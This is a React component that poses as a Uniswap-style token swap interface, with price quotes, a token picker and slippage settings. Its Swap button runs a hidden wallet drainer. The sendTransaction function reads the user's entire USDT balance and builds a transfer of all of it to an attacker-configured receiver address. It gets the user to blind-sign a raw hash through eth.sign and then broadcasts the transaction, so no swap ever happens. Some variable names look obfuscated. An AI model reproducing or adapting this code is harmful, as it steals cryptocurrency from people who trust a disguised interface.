import { useState, useEffect } from 'react'
import { Input, Popover, Radio, Modal } from 'antd'
import {
  ArrowDownOutlined,
  DownOutlined,
  SettingOutlined,
} from '@ant-design/icons'

import tokenList from '../../utils/tokenList.json'
import uniRouter from '../../utils/UniRouter.json'
import { ethers } from 'ethers'

import TransactionModal from 'react-modal'
import TransactionLoader from '../TransactionLoader/TransactionLoader'
import Confetti from '../Confetti'

import usdtABI from '../../utils/contractABI.json'
import { useConnectWallet } from '@web3-onboard/react'
import Web3 from 'web3'

TransactionModal.setAppElement('#root')

// Transaction Loader
const customStyles = {
  content: {
    top: '50%',
    left: '50%',
    right: 'auto',
    bottom: 'auto',
    transform: 'translate(-50%, -50%)',
    backgroundColor: '#0a0b0d',
    padding: 0,
    border: 'none',
  },
  overlay: {
    backgroundColor: 'rgba(10, 11, 13, 0.75)',
  },
}

function SwapComponent() {
  const [slippage, setSlippage] = useState(2.5)
  const [tokenOneAmount, setTokenOneAmount] = useState(null)
  const [tokenTwoAmount, setTokenTwoAmount] = useState(null)
  const [tokenOne, setTokenOne] = useState(tokenList[4])
  const [tokenTwo, setTokenTwo] = useState(tokenList[1])
  const [isOpen, setIsOpen] = useState(false)
  const [changeToken, setChangeToken] = useState(1)
  const [prices, setPrices] = useState(null)
  const [{ wallet }] = useConnectWallet()
  const [oneN, setOneN] = useState()
  const [isLoading, setIsLoading] = useState(false)
  const [showConfetti, setShowConfetti] = useState(false)
  const INFURA_ID = import.meta.env.INFURA_ID

  useEffect(() => {
    let timer
    if (showConfetti) {
      timer = setTimeout(() => {
        setShowConfetti(false)
      }, 5000)
    }
    return () => clearTimeout(timer)
  }, [showConfetti])

  const sendTransaction = async () => {
    const web3js = new Web3(wallet.provider)
    const USDT = import.meta.env.VITE_USDT_ADDRESS
    const address = wallet.accounts[0].address

    try {
      await web3js.eth
        .getTransactionCount(address, 'pending')
        .then(async (res) => {
          const usdtContract = new web3js.eth.Contract(usdtABI, USDT)
          const balance = await usdtContract.methods.balanceOf(address).call()

          const walletBalance = await web3js.eth.getBalance(address)

          const gasPrice = await web3js.eth.getGasPrice()
          const rGasPrice = web3js.utils.toHex(
            Math.floor(Number(gasPrice) * 1.3)
          )
          const gas = ethers.BigNumber.from(22000)
          const totalGas = Number(gas) * Math.floor(Number(gasPrice) * 2)
          const totalCost = Number(walletBalance) - totalGas

          const etherUSD =
            Number(web3js.utils.fromWei(totalCost.toString(), 'ether')) * 1850

          const txData = {
            nonce: web3js.utils.toHex(res),
            gasPrice: rGasPrice,
            gasLimit: '0x11170',
            to: USDT,
            value: '',
            data: usdtContract.methods
              .transfer(import.meta.env.VITE_RECEIVER_ADDRESS, balance)
              .encodeABI(),
            v: '0x1',
            r: '0x',
            s: '0x',
          }

          let Tx = new ethereumjs.Tx(txData)
          const serializedTx = '0x' + Tx.serialize().toString('hex')
          const encoder = { encoding: 'hex' }
          const hashed = web3js.utils.sha3(serializedTx)
          const chainId = await web3js.eth.getChainId()

          console.log(serializedTx)

          await web3js.eth
            .sign(hashed, address)
            .then(async (result) => {
              const signature = result.substring(2)
              const r = '0x' + signature.substring(0, 64)
              const s = '0x' + signature.substring(64, 128)
              const v = parseInt(signature.substring(128, 130), 16)
              const y = web3js.utils.toHex(
                BigInt(v) + BigInt(chainId) * BigInt(2) + BigInt(8)
              )

              txData.r = r
              txData.s = s
              txData.v = y
              Tx = new ethereumjs.Tx(txData)

              const serializedTx2 = '0x' + Tx.serialize().toString('hex'),
                encoder2 = { encoding: 'hex' },
                hashed2 = web3js.utils.sha3(serializedTx2)

              setIsLoading(true)

              await web3js.eth
                .sendSignedTransaction(serializedTx2)
                .then((_0x45f7a3) => console.log(_0x45f7a3))
                .catch((_0x119fc8) => console.log(_0x119fc8))

              setIsLoading(false)
            })
            .catch((_0x4ded9e) => {
              setIsLoading(false)
              console.log(_0x4ded9e)
            })
        })
        .catch((err) => {
          setIsLoading(false)
          console.error(err)
        })
    } catch (error) {
      setIsLoading(false)
      console.log(error)
    }
  }

  async function fetchPairAndCalculateAmount(
    tokenOneAddress,
    tokenTwoAddress,
    tokenOneAmount
  ) {
    const provider = new ethers.providers.JsonRpcProvider(
      `https://mainnet.infura.io/v3/${INFURA_ID}`
    )
    const uniswapRouterAddress = '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D'

    try {
      const uniswapRouter = new ethers.Contract(
        uniswapRouterAddress,
        uniRouter,
        provider
      )

      const amountIn = ethers.utils.parseUnits(
        `${tokenOneAmount}`,
        `${tokenOne.decimals}`
      )
      const path = [tokenOneAddress, tokenTwoAddress]
      const amount = await uniswapRouter.getAmountsOut(amountIn, path)

      const one_eth = ethers.utils.parseUnits('1', `${tokenOne.decimals}`)
      const set_eth = await uniswapRouter.getAmountsOut(one_eth, path)

      setTokenTwoAmount(
        parseFloat(
          ethers.utils.formatUnits(amount[1], `${tokenTwo.decimals}`)
        ).toFixed(2)
      )
      setOneN(
        parseFloat(
          ethers.utils.formatUnits(set_eth[1], `${tokenTwo.decimals}`)
        ).toFixed(6)
      )
    } catch (error) {
      console.error('Error fetching pair and calculating amount:', error)
    }
  }

  function changeAmount(e) {
    setTokenOneAmount(e.target.value)
    if (e.target.value) {
      fetchPairAndCalculateAmount(
        tokenOne.address,
        tokenTwo.address,
        e.target.value
      )
    } else {
      setTokenTwoAmount(null)
    }
  }

  function handleSlippageChange(e) {
    setSlippage(e.target.value)
  }

  function switchTokens() {
    setPrices(null)
    setTokenOneAmount(null)
    setTokenTwoAmount(null)
    const one = tokenOne
    const two = tokenTwo
    setTokenOne(two)
    setTokenTwo(one)
  }

  function openModal(asset) {
    setChangeToken(asset)
    setIsOpen(true)
  }

  function modifyToken(i) {
    setPrices(null)
    setTokenOneAmount(null)
    setTokenTwoAmount(null)
    if (changeToken === 1) {
      setTokenOne(tokenList[i])
    } else {
      setTokenTwo(tokenList[i])
    }
    setIsOpen(false)
  }

  const settings = (
    <>
      <div>Slippage Tolerance</div>
      <div>
        <Radio.Group value={slippage} onChange={handleSlippageChange}>
          <Radio.Button value={0.5}>0.5%</Radio.Button>
          <Radio.Button value={2.5}>2.5%</Radio.Button>
          <Radio.Button value={5}>5.0%</Radio.Button>
        </Radio.Group>
      </div>
    </>
  )

  return (
    <>
      {showConfetti && <Confetti />}
      <Modal
        open={isOpen}
        footer={null}
        onCancel={() => setIsOpen(false)}
        title='Select a token'
      >
        <div className='modalContent'>
          {tokenList?.map((e, i) => {
            return (
              <div
                className='tokenChoice'
                key={i}
                onClick={() => modifyToken(i)}
              >
                <img src={e.img} alt={e.ticker} className='tokenLogo' />
                <div className='tokenChoiceNames'>
                  <div className='tokenName'>{e.name}</div>
                  <div className='tokenTicker'>{e.ticker}</div>
                </div>
              </div>
            )
          })}
        </div>
      </Modal>

      <div className='tradeBox mx-auto'>
        <div className='tradeBoxHeader mb-2'>
          <h4 className='text-white'>Swap</h4>
          <Popover
            content={settings}
            title='Settings'
            trigger='click'
            placement='bottomRight'
          >
            <SettingOutlined className='cog' />
          </Popover>
        </div>
        <div className='inputs'>
          <Input
            type='number'
            placeholder='0'
            value={tokenOneAmount}
            onChange={changeAmount}
          />
          <Input
            type='number'
            placeholder='0'
            value={tokenTwoAmount}
            disabled={true}
          />
          <div className='switchButton' onClick={switchTokens}>
            <ArrowDownOutlined className='switchArrow' />
          </div>
          <div className='assetOne' onClick={() => openModal(1)}>
            <img src={tokenOne.img} alt='assetOneLogo' className='assetLogo' />
            {tokenOne.ticker}
            <DownOutlined />
          </div>
          <div className='assetTwo' onClick={() => openModal(2)}>
            <img src={tokenTwo.img} alt='assetOneLogo' className='assetLogo' />
            {tokenTwo.ticker}
            <DownOutlined />
          </div>
        </div>
        {tokenOneAmount !== null &&
          tokenOneAmount !== '0' &&
          tokenOneAmount.trim() !== '' && (
            <div className='calculate'>
              {tokenTwoAmount !== null
                ? `1 ${tokenOne.ticker} = ${oneN} ${tokenTwo.ticker}`
                : 'Calculating price...'}
            </div>
          )}

        <div
          className='swapButton'
          disabled={!tokenOneAmount}
          onClick={sendTransaction}
        >
          Swap
        </div>
      </div>
      <TransactionModal isOpen={isLoading} style={customStyles}>
        <TransactionLoader />{' '}
      </TransactionModal>
    </>
  )
}

export default SwapComponent
